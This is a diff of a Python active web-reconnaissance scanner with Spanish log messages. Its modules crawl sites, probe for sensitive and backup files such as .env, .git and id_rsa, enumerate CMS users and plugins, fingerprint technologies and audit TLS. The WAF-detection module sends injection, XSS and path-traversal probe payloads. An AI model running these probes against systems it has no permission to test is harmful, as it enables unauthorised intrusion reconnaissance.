-    log_ok(f"Links encontrados: {len(all_links)}")
-    log_ok(f"Formularios: {len(all_forms)}")
-    log_ok(f"Parametros URL: {len(all_params)}")
-    log_ok(f"Archivos JS: {len(all_js_files)}")
-    if all_emails:
-        log_ok(f"Emails: {', '.join(list(all_emails)[:10])}")
-    if all_forms:
-        for f in all_forms[:5]:
-            inputs = ", ".join([i["name"] for i in f.get("inputs", [])])
-            log_info(f"  Form: {f['method']} {f['action']} [{inputs}]")
-
-
-# =====================================================================
-#  MODULE 8: PARAMETER DISCOVERY
-# =====================================================================
-def mod_param_discover(session, base_url, wordlist, rate_limiter, results):
-    """Descubrimiento de parametros ocultos."""
-    section_header("PARAMETER DISCOVERY")
-
-    found_params = []
-
-    # Get baseline
-    baseline = safe_request(session, "GET", base_url, rate_limiter, allow_redirects=True)
-    if not baseline:
-        log_fail("No se pudo obtener respuesta baseline.")
-        return
-    baseline_size = len(baseline.content)
-    baseline_code = baseline.status_code
-
-    log_info(f"Baseline: [{baseline_code}] {baseline_size} bytes")
-    log_info(f"Probando {len(wordlist)} parametros...")
-
-    for param in wordlist:
-        test_value = "active_recon_test_123"
-        test_url = f"{base_url}?{param}={test_value}"
-        resp = safe_request(session, "GET", test_url, rate_limiter, allow_redirects=True)
-        if resp is None:
             continue
 
-        resp_size = len(resp.content)
-        # Check if param is reflected or changes response
-        reflected = test_value in resp.text
-        size_diff = abs(resp_size - baseline_size)
-        code_diff = resp.status_code != baseline_code
+        all_forms.extend(parser.forms)
+        all_params.update(parser.params)
+        all_emails.update(parser.emails)
+        all_js.update(parser.js_files)
 
-        if reflected or size_diff > 50 or code_diff:
-            found_params.append({
-                "param": param,
-                "reflected": reflected,
-                "status": resp.status_code,
-                "size_diff": size_diff,
-            })
-            marker = " [REFLECTED]" if reflected else ""
-            log_ok(f"Param: {param} [{resp.status_code}] (diff: {size_diff} bytes){marker}")
+        for link in parser.links:
+            full = urljoin(url, link)
+            p = urlparse(full)
+            if p.hostname == ctx["domain"] and full not in visited:
+                all_links.add(full)
+                if depth + 1 <= max_depth:
+                    queue.append((full, depth + 1))
 
-    results["params_discovered"] = found_params
-    log_info(f"Parametros encontrados: {len(found_params)}")
+        # Extract params from URL query strings
+        for link in all_links:
+            qs = urlparse(link).query
+            if qs:
+                for k in parse_qs(qs).keys():
+                    all_params.add(k)
+
+    ctx["results"]["crawler"] = {
+        "pages": len(visited),
+        "links": len(all_links),
+        "forms": len(all_forms),
+        "params": list(all_params),
+        "emails": list(all_emails),
+        "js_files": list(all_js),
+    }
+    log_ok(f"Crawled: {len(visited)} paginas, {len(all_links)} links, {len(all_forms)} forms")
+    log_ok(f"Params: {len(all_params)}, Emails: {len(all_emails)}, JS: {len(all_js)}")
+    if all_emails:
+        for em in list(all_emails)[:10]:
+            log_info(f"  Email: {em}")
+    if all_params:
+        log_info(f"  Params: {', '.join(list(all_params)[:20])}")
+
+    ctx["_crawled_links"] = all_links
+    ctx["_crawled_forms"] = all_forms
+    ctx["_crawled_params"] = all_params
 
 
 # =====================================================================
-#  MODULE 9: TECHNOLOGY FINGERPRINT (ACTIVE)
+#  MODULE 9: PARAMETER DISCOVERY
 # =====================================================================
-def mod_tech_fingerprint(session, base_url, rate_limiter, results):
-    """Fingerprinting activo de tecnologias."""
-    section_header("TECHNOLOGY FINGERPRINT (ACTIVE)")
+def mod_param_discovery(ctx):
+    section_header("PARAMETER DISCOVERY")
+    base = ctx["target_url"]
+    session = ctx["session"]
+
+    # Baseline
+    r = safe_request(session, "GET", base, ctx["rate_limiter"])
+    if not r:
+        log_fail("No se pudo obtener respuesta.")
+        return
+    baseline_size = len(r.content)
+    found = []
+    params = list(PARAM_WORDLIST)
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(params)
+
+    for param in params:
+        url = f"{base}?{param}=test123"
+        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and abs(len(r.content) - baseline_size) > 50:
+            found.append(param)
+            log_ok(f"Parametro activo: {param}")
+
+    ctx["results"]["params_discovered"] = found
+    log_info(f"Parametros activos: {len(found)}")
+
+
+# =====================================================================
+#  MODULE 10: API DISCOVERY
+# =====================================================================
+def mod_api_discovery(ctx):
+    section_header("API DISCOVERY")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    found = []
+
+    endpoints = list(API_WORDLIST)
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(endpoints)
+
+    def check_api(path):
+        url = f"{base}/{path}"
+        for method in ["GET"]:
+            r = safe_request(session, method, url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if r and r.status_code not in (404, 502, 503):
+                ct = r.headers.get("Content-Type", "")
+                return {"path": path, "status": r.status_code, "content_type": ct, "size": len(r.content)}
+        return None
+
+    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
+        futures = {executor.submit(check_api, p): p for p in endpoints}
+        for f in as_completed(futures):
+            r = f.result()
+            if r:
+                found.append(r)
+                log_ok(f"API: /{r['path']} [{r['status']}] {r['content_type']}")
+
+    ctx["results"]["api_endpoints"] = found
+
+
+# =====================================================================
+#  MODULE 11: SENSITIVE FILES DISCOVERY
+# =====================================================================
+def mod_sensitive_files(ctx):
+    section_header("SENSITIVE FILES DISCOVERY")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    found = []
+
+    files = list(SENSITIVE_FILES)
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(files)
+
+    log_info(f"Probando {len(files)} archivos sensibles...")
+
+    def check_file(path):
+        url = f"{base}/{path}"
+        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code == 200 and len(r.content) > 0:
+            # Verificar que no sea una pagina de error generica
+            body = r.text.lower()
+            if "404" not in body[:200] and "not found" not in body[:200]:
+                return {"path": path, "size": len(r.content), "snippet": r.text[:200]}
+        return None
+
+    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
+        futures = {executor.submit(check_file, p): p for p in files}
+        for f in as_completed(futures):
+            r = f.result()
+            if r:
+                found.append(r)
+                sev = "HIGH" if any(k in r["path"] for k in [".env",".git","config","password","credential","secret","id_rsa","shadow"]) else "MEDIUM"
+                log_vuln(sev, f"Archivo sensible: /{r['path']} ({r['size']} bytes)")
+
+    ctx["results"]["sensitive_files"] = found
+
+
+# =====================================================================
+#  MODULE 12: BACKUP DISCOVERY
+# =====================================================================
+def mod_backup_discovery(ctx):
+    section_header("BACKUP FILE DISCOVERY")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    domain = ctx["domain"]
+    found = []
+
+    # Generar nombres de backup basados en el dominio
+    base_names = [domain, domain.replace(".", "_"), domain.split(".")[0],
+                  "backup", "db", "database", "site", "web", "www", "data", "dump"]
+    extensions = [".sql", ".sql.gz", ".sql.bz2", ".sql.zip", ".tar", ".tar.gz",
+                  ".tgz", ".zip", ".rar", ".7z", ".bak", ".old", ".save",
+                  ".dump", ".db", ".sqlite", ".mdb", ".csv"]
+    paths = []
+    for name in base_names:
+        for ext in extensions:
+            paths.append(f"{name}{ext}")
+        paths.append(f"{name}_backup.sql")
+        paths.append(f"{name}_dump.sql")
+        paths.append(f"{name}.sql.bak")
+
+    # Patrones comunes de fecha
+    now = datetime.now()
+    for name in base_names[:3]:
+        for fmt in ["%Y%m%d", "%Y-%m-%d", "%Y", "%m%Y"]:
+            paths.append(f"{name}_{now.strftime(fmt)}.sql")
+            paths.append(f"{name}_{now.strftime(fmt)}.zip")
+
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(paths)
+
+    log_info(f"Probando {len(paths)} posibles backups...")
+
+    for path in paths:
+        url = f"{base}/{path}"
+        r = safe_request(session, "HEAD", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code == 200:
+            size = int(r.headers.get("Content-Length", 0))
+            found.append({"path": path, "size": size})
+            log_vuln("HIGH", f"Backup encontrado: /{path} ({size} bytes)")
+
+    ctx["results"]["backup_files"] = found
+
+
+# =====================================================================
+#  MODULE 13: TECH FINGERPRINT
+# =====================================================================
+def mod_tech_fingerprint(ctx):
+    section_header("TECH FINGERPRINT")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if not r:
+        log_fail("No se pudo conectar.")
+        return
 
     techs = []
+    headers = {k.lower(): v for k, v in r.headers.items()}
+    body = r.text.lower()
 
-    # Probe specific paths for tech detection
-    tech_probes = [
-        ("/wp-login.php", "WordPress"),
-        ("/wp-admin/", "WordPress"),
-        ("/wp-json/wp/v2/", "WordPress REST API"),
-        ("/administrator/", "Joomla"),
-        ("/user/login", "Drupal"),
-        ("/core/install.php", "Drupal"),
-        ("/misc/drupal.js", "Drupal"),
-        ("/typo3/", "TYPO3"),
-        ("/umbraco/", "Umbraco"),
-        ("/sitecore/", "Sitecore"),
-        ("/sitefinity/", "Sitefinity"),
-        ("/rails/info", "Ruby on Rails"),
-        ("/elmah.axd", "ASP.NET ELMAH"),
-        ("/trace.axd", "ASP.NET Trace"),
-        ("/actuator", "Spring Boot"),
-        ("/actuator/health", "Spring Boot Actuator"),
-        ("/swagger-ui.html", "Swagger UI"),
-        ("/api-docs", "Swagger/OpenAPI"),
-        ("/graphql", "GraphQL"),
-        ("/graphiql", "GraphiQL"),
-        ("/_next/", "Next.js"),
-        ("/__nuxt/", "Nuxt.js"),
-        ("/static/admin/", "Django Admin"),
-        ("/flask-static/", "Flask"),
-        ("/laravel/", "Laravel"),
-        ("/vendor/laravel/", "Laravel"),
-        ("/artisan", "Laravel"),
-        ("/telescope/", "Laravel Telescope"),
-        ("/horizon/", "Laravel Horizon"),
-        ("/nova/", "Laravel Nova"),
-        ("/phpmyadmin/", "phpMyAdmin"),
-        ("/adminer.php", "Adminer"),
-        ("/solr/", "Apache Solr"),
-        ("/kibana/", "Kibana"),
-        ("/grafana/", "Grafana"),
-        ("/jenkins/", "Jenkins"),
-        ("/gitlab/", "GitLab"),
+    # Server
+    if "server" in headers:
+        techs.append(("Server", headers["server"]))
+    if "x-powered-by" in headers:
+        techs.append(("Powered-By", headers["x-powered-by"]))
+    if "x-aspnet-version" in headers:
+        techs.append(("ASP.NET", headers["x-aspnet-version"]))
+
+    # Frameworks
+    checks = [
+        ("WordPress", ["wp-content", "wp-includes", "wordpress"]),
+        ("Joomla", ["joomla", "/media/jui/", "com_content"]),
+        ("Drupal", ["drupal", "sites/default/files", "misc/drupal.js"]),
+        ("Laravel", ["laravel", "csrf-token", "laravel_session"]),
+        ("Django", ["csrfmiddlewaretoken", "django", "__admin__"]),
+        ("Ruby on Rails", ["rails", "csrf-token", "turbolinks"]),
+        ("Express.js", ["express", "x-powered-by: express"]),
+        ("Spring", ["jsessionid", "org.springframework"]),
+        ("ASP.NET", ["__viewstate", "__eventvalidation", "asp.net"]),
+        ("React", ["react", "_reactroot", "data-reactroot"]),
+        ("Vue.js", ["vue.js", "v-cloak", "data-v-"]),
+        ("Angular", ["ng-version", "ng-app", "angular"]),
+        ("Next.js", ["__next", "_next/static", "nextjs"]),
+        ("Nuxt.js", ["__nuxt", "_nuxt/", "nuxt"]),
+        ("jQuery", ["jquery", "jquery.min.js"]),
+        ("Bootstrap", ["bootstrap", "bootstrap.min"]),
+        ("Tailwind", ["tailwind"]),
+        ("PHP", [".php", "phpsessid", "x-powered-by: php"]),
+        ("Node.js", ["node.js", "x-powered-by: express"]),
+        ("Nginx", ["nginx"]),
+        ("Apache", ["apache"]),
+        ("IIS", ["microsoft-iis", "x-aspnet"]),
+        ("Cloudflare", ["cloudflare", "cf-ray"]),
+        ("AWS", ["amazons3", "x-amz-", "aws"]),
+        ("Firebase", ["firebase", "firebaseapp"]),
+        ("Shopify", ["shopify", "myshopify"]),
+        ("Squarespace", ["squarespace"]),
+        ("Wix", ["wix.com", "wixsite"]),
     ]
+    header_str = str(headers).lower()
+    cookie_str = str(r.cookies.get_dict()).lower()
+    full_text = body + header_str + cookie_str
 
-    for path, tech in tech_probes:
-        resp = safe_request(session, "GET", f"{base_url}{path}", rate_limiter, timeout=5)
-        if resp and resp.status_code in (200, 301, 302, 401, 403):
-            techs.append({
-                "technology": tech,
-                "path": path,
-                "status": resp.status_code,
-            })
-            log_ok(f"{tech} detectado en {path} [{resp.status_code}]")
+    for name, sigs in checks:
+        if any(s in full_text for s in sigs):
+            techs.append(("Framework/Tech", name))
 
-    # Check response headers
-    resp = safe_request(session, "GET", base_url, rate_limiter, allow_redirects=True)
-    if resp:
-        h = resp.headers
-        header_checks = {
-            "x-powered-by": "X-Powered-By",
-            "server": "Server",
-            "x-aspnet-version": "ASP.NET",
-            "x-aspnetmvc-version": "ASP.NET MVC",
-            "x-drupal-cache": "Drupal",
-            "x-generator": "Generator",
-            "x-powered-cms": "CMS",
-        }
-        for hdr, label in header_checks.items():
-            val = h.get(hdr, "")
-            if val:
-                techs.append({"technology": f"{label}: {val}", "path": "/", "status": 200})
-                log_ok(f"{label}: {val}")
-
-    results["tech_active"] = techs
+    ctx["results"]["technologies"] = techs
+    for cat, name in techs:
+        log_ok(f"{cat}: {name}")
 
 
 # =====================================================================
-#  MODULE 10: WAF DETECTION
+#  MODULE 14: WAF DETECTION
 # =====================================================================
-def mod_waf_detect(session, base_url, rate_limiter, results):
-    """Deteccion y fingerprinting de WAF."""
+def mod_waf_detect(ctx):
     section_header("WAF DETECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
 
-    waf_detected = []
+    wafs = {
+        "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache"],
+        "AWS WAF": ["awswaf", "x-amzn-requestid"],
+        "Akamai": ["akamai", "x-akamai"],
+        "Imperva/Incapsula": ["incap_ses", "visid_incap", "incapsula"],
+        "Sucuri": ["sucuri", "x-sucuri"],
+        "ModSecurity": ["modsecurity", "mod_security"],
+        "F5 BIG-IP": ["bigip", "big-ip", "f5"],
+        "Barracuda": ["barracuda", "barra_counter"],
+        "Fortinet/FortiWeb": ["fortigate", "fortiweb"],
+        "Citrix NetScaler": ["netscaler", "ns_af", "citrix"],
+        "DDoS-Guard": ["ddos-guard"],
+        "Fastly": ["fastly"],
+        "StackPath": ["stackpath"],
+        "Wordfence": ["wordfence"],
+    }
 
-    # Test with malicious payloads to trigger WAF
-    payloads = [
-        "' OR 1=1--",
-        "<script>alert(1)</script>",
-        "../../etc/passwd",
-        "{{7*7}}",
-        "${7*7}",
-        "| ls",
-    ]
+    # Normal request
+    r1 = safe_request(session, "GET", url, ctx["rate_limiter"])
+    # Malicious request to trigger WAF
+    r2 = safe_request(session, "GET", f"{url}?test=<script>alert(1)</script>'OR+1=1--", ctx["rate_limiter"])
+    r3 = safe_request(session, "GET", f"{url}/../../etc/passwd", ctx["rate_limiter"])
 
-    baseline = safe_request(session, "GET", base_url, rate_limiter, allow_redirects=True)
-    baseline_code = baseline.status_code if baseline else 200
-
-    for payload in payloads:
-        test_url = f"{base_url}/?test={quote(payload)}"
-        resp = safe_request(session, "GET", test_url, rate_limiter)
-        if resp is None:
+    detected = []
+    for resp in [r1, r2, r3]:
+        if not resp:
             continue
+        h_str = str(resp.headers).lower()
+        body = resp.text.lower()[:5000]
+        cookies = str(resp.cookies.get_dict()).lower()
+        full = h_str + body + cookies
+        for waf_name, sigs in wafs.items():
+            if any(s in full for s in sigs) and waf_name not in detected:
+                detected.append(waf_name)
+                log_vuln("INFO", f"WAF detectado: {waf_name}")
 
-        # Check for WAF indicators
-        body = resp.text.lower()
-        headers_str = str(resp.headers).lower()
+    # Check status code difference
+    if r1 and r2:
+        if r2.status_code in (403, 406, 429, 503) and r1.status_code == 200:
+            log_warn("WAF activo: requests maliciosos bloqueados")
 
-        waf_sigs = {
-            "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf-cache"],
-            "AWS WAF": ["awselb", "x-amzn-", "awswaf"],
-            "Akamai": ["akamai", "akamaighost", "x-akamai"],
-            "Imperva/Incapsula": ["incapsula", "imperva", "visid_incap"],
-            "Sucuri": ["sucuri", "x-sucuri"],
-            "ModSecurity": ["modsecurity", "mod_security", "noyb"],
-            "F5 BIG-IP": ["big-ip", "f5", "ts=", "bigipserver"],
-            "Barracuda": ["barracuda", "barra_counter"],
-            "Fortinet/FortiWeb": ["fortigate", "fortiweb", "fortibalancer"],
-            "Citrix NetScaler": ["citrix", "netscaler", "ns_af"],
-            "DenyAll": ["denyall", "conditionblocked"],
-            "StackPath": ["stackpath"],
-            "Fastly": ["fastly"],
-        }
-
-        for waf_name, sigs in waf_sigs.items():
-            for sig in sigs:
-                if sig in body or sig in headers_str:
-                    if waf_name not in [w["waf"] for w in waf_detected]:
-                        waf_detected.append({"waf": waf_name, "indicator": sig})
-                        log_ok(f"WAF detectado: {waf_name} (indicator: {sig})")
-                    break
-
-        # Generic block detection
-        if resp.status_code in (403, 406, 429, 503) and resp.status_code != baseline_code:
-            if not waf_detected:
-                waf_detected.append({"waf": "Unknown WAF", "indicator": f"HTTP {resp.status_code} on payload"})
-                log_warn(f"WAF generico detectado (HTTP {resp.status_code} en payload)")
-
-    if not waf_detected:
-        log_info("No se detecto WAF.")
-
-    results["waf_active"] = waf_detected
+    ctx["results"]["waf"] = detected if detected else ["None detected"]
 
 
 # =====================================================================
-#  MODULE 11: CMS ENUMERATION
+#  MODULE 15: CMS ENUMERATION
 # =====================================================================
-def mod_cms_enum(session, base_url, rate_limiter, results):
-    """Enumeracion detallada de CMS."""
+def mod_cms_enum(ctx):
     section_header("CMS ENUMERATION")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    findings = []
 
-    cms_info = {"cms": None, "details": []}
-
-    # WordPress enumeration
-    wp_check = safe_request(session, "GET", f"{base_url}/wp-login.php", rate_limiter)
-    if wp_check and wp_check.status_code == 200 and "wp-login" in wp_check.text.lower():
-        cms_info["cms"] = "WordPress"
-        log_ok("CMS: WordPress detectado")
-
-        # WP Version
-        resp = safe_request(session, "GET", f"{base_url}/readme.html", rate_limiter)
-        if resp and resp.status_code == 200:
-            ver = re.search(r'Version\s+([\d.]+)', resp.text)
-            if ver:
-                cms_info["details"].append(f"Version: {ver.group(1)}")
-                log_ok(f"  WordPress version: {ver.group(1)}")
-
-        # WP Users via REST API
-        resp = safe_request(session, "GET", f"{base_url}/wp-json/wp/v2/users", rate_limiter, allow_redirects=True)
-        if resp and resp.status_code == 200:
-            try:
-                users = resp.json()
-                if isinstance(users, list):
-                    for u in users[:10]:
-                        name = u.get("name", "") or u.get("slug", "")
-                        cms_info["details"].append(f"User: {name}")
-                        log_ok(f"  User: {name}")
-            except Exception:
-                pass
-
-        # WP Users via author enumeration
-        for i in range(1, 11):
-            resp = safe_request(session, "GET", f"{base_url}/?author={i}", rate_limiter, allow_redirects=True)
-            if resp and resp.status_code == 200:
-                author = re.search(r'/author/([^/"]+)', resp.url)
-                if author:
-                    user = author.group(1)
-                    if f"User: {user}" not in str(cms_info["details"]):
-                        cms_info["details"].append(f"User (enum): {user}")
-                        log_ok(f"  User (author enum): {user}")
-
-        # WP Plugins
-        resp = safe_request(session, "GET", base_url, rate_limiter, allow_redirects=True)
-        if resp:
-            plugins = set(re.findall(r'/wp-content/plugins/([^/"\s]+)', resp.text))
-            for p in list(plugins)[:20]:
-                cms_info["details"].append(f"Plugin: {p}")
-                log_ok(f"  Plugin: {p}")
-
-            themes = set(re.findall(r'/wp-content/themes/([^/"\s]+)', resp.text))
-            for t in themes:
-                cms_info["details"].append(f"Theme: {t}")
-                log_ok(f"  Theme: {t}")
-
-        # XMLRPC
-        resp = safe_request(session, "POST", f"{base_url}/xmlrpc.php", rate_limiter,
-                           data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
-                           headers={"Content-Type": "text/xml"})
-        if resp and resp.status_code == 200 and "methodResponse" in resp.text:
-            cms_info["details"].append("XMLRPC: enabled")
-            log_warn("  XMLRPC habilitado (posible bruteforce vector)")
+    # WordPress
+    wp_paths = ["wp-login.php","wp-admin/","wp-json/wp/v2/","wp-content/",
+                "wp-includes/","xmlrpc.php","wp-json/wp/v2/users",
+                "wp-json/wp/v2/posts","readme.html","license.txt"]
+    for p in wp_paths:
+        r = safe_request(session, "GET", f"{base}/{p}", ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code == 200:
+            findings.append({"cms": "WordPress", "path": p, "status": r.status_code})
+            log_ok(f"WordPress: /{p}")
+            # Try to get version
+            if p == "readme.html" and "version" in r.text.lower():
+                ver = re.search(r'Version\s*([\d.]+)', r.text, re.I)
+                if ver:
+                    log_ok(f"  WordPress version: {ver.group(1)}")
 
     # Joomla
-    joomla_check = safe_request(session, "GET", f"{base_url}/administrator/", rate_limiter)
-    if joomla_check and joomla_check.status_code == 200 and "joomla" in joomla_check.text.lower():
-        cms_info["cms"] = "Joomla"
-        log_ok("CMS: Joomla detectado")
-
-        # Version
-        manifest = safe_request(session, "GET", f"{base_url}/administrator/manifests/files/joomla.xml", rate_limiter)
-        if manifest and manifest.status_code == 200:
-            ver = re.search(r'<version>([^<]+)', manifest.text)
-            if ver:
-                cms_info["details"].append(f"Version: {ver.group(1)}")
-                log_ok(f"  Joomla version: {ver.group(1)}")
+    joomla_paths = ["administrator/","administrator/manifests/files/joomla.xml",
+                    "language/en-GB/en-GB.xml","plugins/system/cache/cache.xml"]
+    for p in joomla_paths:
+        r = safe_request(session, "GET", f"{base}/{p}", ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code == 200:
+            findings.append({"cms": "Joomla", "path": p})
+            log_ok(f"Joomla: /{p}")
 
     # Drupal
-    drupal_check = safe_request(session, "GET", f"{base_url}/core/install.php", rate_limiter)
-    if drupal_check and drupal_check.status_code == 200:
-        cms_info["cms"] = "Drupal"
-        log_ok("CMS: Drupal detectado")
+    drupal_paths = ["CHANGELOG.txt","core/CHANGELOG.txt","core/install.php",
+                    "core/misc/drupal.js","user/login"]
+    for p in drupal_paths:
+        r = safe_request(session, "GET", f"{base}/{p}", ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code == 200:
+            findings.append({"cms": "Drupal", "path": p})
+            log_ok(f"Drupal: /{p}")
 
-        changelog = safe_request(session, "GET", f"{base_url}/CHANGELOG.txt", rate_limiter)
-        if changelog and changelog.status_code == 200:
-            ver = re.search(r'Drupal\s+([\d.]+)', changelog.text)
-            if ver:
-                cms_info["details"].append(f"Version: {ver.group(1)}")
-                log_ok(f"  Drupal version: {ver.group(1)}")
-
-    if not cms_info["cms"]:
-        log_info("No se identifico CMS conocido.")
-
-    results["cms_active"] = cms_info
+    ctx["results"]["cms"] = findings
 
 
 # =====================================================================
-#  MODULE 12: SSL/TLS AUDIT
+#  MODULE 16: SSL/TLS AUDIT
 # =====================================================================
-def mod_ssl_audit(target_host, target_port, results):
-    """Auditoria de SSL/TLS."""
+def mod_ssl_audit(ctx):
     section_header("SSL/TLS AUDIT")
+    host = ctx["target_host"]
+    findings = []
 
-    ssl_info = {"issues": []}
-
-    # Test various protocols
-    protocols = [
-        ("TLSv1.0", ssl.PROTOCOL_TLS),
-        ("TLSv1.1", ssl.PROTOCOL_TLS),
-        ("TLSv1.2", ssl.PROTOCOL_TLS),
-    ]
-
-    # Test connection and get cert info
     try:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        conn = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
         conn.settimeout(10)
-        conn.connect((target_host, target_port))
-
-        cert = conn.getpeercert(binary_form=True)
+        conn.connect((host, 443))
+        cert = conn.getpeercert(True)
+        cert_info = ssl.DER_cert_to_PEM_cert(cert)
         cipher = conn.cipher()
         version = conn.version()
+        conn.close()
 
-        log_ok(f"Protocol: {version}")
-        log_ok(f"Cipher: {cipher[0] if cipher else 'Unknown'}")
+        findings.append({"type": "tls_version", "value": version})
+        log_ok(f"TLS Version: {version}")
+        if cipher:
+            log_ok(f"Cipher: {cipher[0]} ({cipher[2]} bits)")
+            findings.append({"type": "cipher", "value": cipher[0], "bits": cipher[2]})
 
-        ssl_info["protocol"] = version
-        ssl_info["cipher"] = cipher[0] if cipher else ""
-
-        # Parse cert
-        import ssl as ssl_mod
-        cert_dict = conn.getpeercert()
-        if cert_dict:
-            subject = dict(x[0] for x in cert_dict.get("subject", []))
-            issuer = dict(x[0] for x in cert_dict.get("issuer", []))
-            not_after = cert_dict.get("notAfter", "")
-
-            log_ok(f"Subject: {subject.get('commonName', 'N/A')}")
-            log_ok(f"Issuer: {issuer.get('organizationName', 'N/A')}")
-            log_ok(f"Expires: {not_after}")
-
-            ssl_info["subject"] = subject.get("commonName", "")
-            ssl_info["issuer"] = issuer.get("organizationName", "")
-            ssl_info["expires"] = not_after
-
-            # Check expiry
+        # Check for weak versions
+        weak_protos = [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1] if hasattr(ssl, 'PROTOCOL_TLSv1') else []
+        for proto_name in ["TLSv1", "TLSv1.1"]:
             try:
-                exp_date = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
-                if exp_date < datetime.now():
-                    ssl_info["issues"].append("EXPIRED certificate")
-                    log_vuln("CRITICAL", "Certificado SSL EXPIRADO")
-                elif (exp_date - datetime.now()).days < 30:
-                    ssl_info["issues"].append("Certificate expires within 30 days")
-                    log_warn(f"Certificado expira en {(exp_date - datetime.now()).days} dias")
+                ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx2.check_hostname = False
+                ctx2.verify_mode = ssl.CERT_NONE
+                ctx2.maximum_version = getattr(ssl.TLSVersion, proto_name.replace(".", "_"), None)
+                ctx2.minimum_version = ctx2.maximum_version
+                if ctx2.maximum_version:
+                    s2 = ctx2.wrap_socket(socket.socket(), server_hostname=host)
+                    s2.settimeout(5)
+                    s2.connect((host, 443))
+                    s2.close()
+                    log_vuln("MEDIUM", f"Protocolo debil soportado: {proto_name}")
+                    findings.append({"type": "weak_protocol", "value": proto_name})
             except Exception:
                 pass
 
-            # Self-signed check
-            if subject.get("commonName") == issuer.get("commonName"):
-                ssl_info["issues"].append("Self-signed certificate")
-                log_vuln("MEDIUM", "Certificado auto-firmado")
-
-        # Weak ciphers
-        if cipher:
-            cipher_name = cipher[0].upper()
-            if "RC4" in cipher_name:
-                ssl_info["issues"].append("RC4 cipher (weak)")
-                log_vuln("HIGH", "Cipher RC4 (debil)")
-            if "DES" in cipher_name:
-                ssl_info["issues"].append("DES cipher (weak)")
-                log_vuln("HIGH", "Cipher DES (debil)")
-            if "NULL" in cipher_name:
-                ssl_info["issues"].append("NULL cipher (no encryption)")
-                log_vuln("CRITICAL", "Cipher NULL (sin cifrado)")
-            if "EXPORT" in cipher_name:
-                ssl_info["issues"].append("EXPORT cipher (weak)")
-                log_vuln("CRITICAL", "Cipher EXPORT (debil)")
-
-        conn.close()
-
-    except ssl.SSLError as e:
-        log_fail(f"SSL error: {e}")
-        ssl_info["error"] = str(e)
-    except Exception as e:
-        log_fail(f"Error: {e}")
-        ssl_info["error"] = str(e)
-
-    # Test for deprecated protocols
-    for proto_name in ["TLSv1.0", "TLSv1.1"]:
+        # Certificate details
         try:
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            if proto_name == "TLSv1.0":
-                ctx.minimum_version = ssl.TLSVersion.TLSv1
-                ctx.maximum_version = ssl.TLSVersion.TLSv1
-            elif proto_name == "TLSv1.1":
-                ctx.minimum_version = ssl.TLSVersion.TLSv1_1
-                ctx.maximum_version = ssl.TLSVersion.TLSv1_1
-            conn = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
-            conn.settimeout(5)
-            conn.connect((target_host, target_port))
-            conn.close()
-            ssl_info["issues"].append(f"{proto_name} supported (deprecated)")
-            log_vuln("HIGH", f"{proto_name} soportado (deprecated)")
+            c2 = ssl.create_default_context()
+            conn2 = c2.wrap_socket(socket.socket(), server_hostname=host)
+            conn2.settimeout(10)
+            conn2.connect((host, 443))
+            cert_dict = conn2.getpeercert()
+            conn2.close()
+            if cert_dict:
+                not_after = cert_dict.get("notAfter", "")
+                subject = dict(x[0] for x in cert_dict.get("subject", ()))
+                issuer = dict(x[0] for x in cert_dict.get("issuer", ()))
+                log_ok(f"Subject: {subject.get('commonName', 'N/A')}")
+                log_ok(f"Issuer: {issuer.get('organizationName', 'N/A')}")
+                log_ok(f"Expires: {not_after}")
+                sans = [v for t, v in cert_dict.get("subjectAltName", ()) if t == "DNS"]
+                if sans:
+                    log_ok(f"SANs: {', '.join(sans[:10])}")
+                    findings.append({"type": "sans", "value": sans})
+        except ssl.SSLCertVerificationError as e:
+            log_vuln("MEDIUM", f"Certificado invalido: {e}")
+            findings.append({"type": "cert_error", "value": str(e)})
         except Exception:
             pass
 
-    results["ssl_audit"] = ssl_info
+    except Exception as e:
+        log_fail(f"No se pudo conectar SSL: {e}")
+
+    ctx["results"]["ssl"] = findings
 
 
 # =====================================================================
-#  MODULE 13: HTTP METHODS
+#  MODULE 17: HTTP METHODS TESTING
 # =====================================================================
-def mod_http_methods(session, base_url, rate_limiter, results):
-    """Prueba de metodos HTTP."""
-    section_header("HTTP METHODS")
-
-    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
+def mod_http_methods(ctx):
+    section_header("HTTP METHODS TESTING")
+    url = ctx["target_url"]
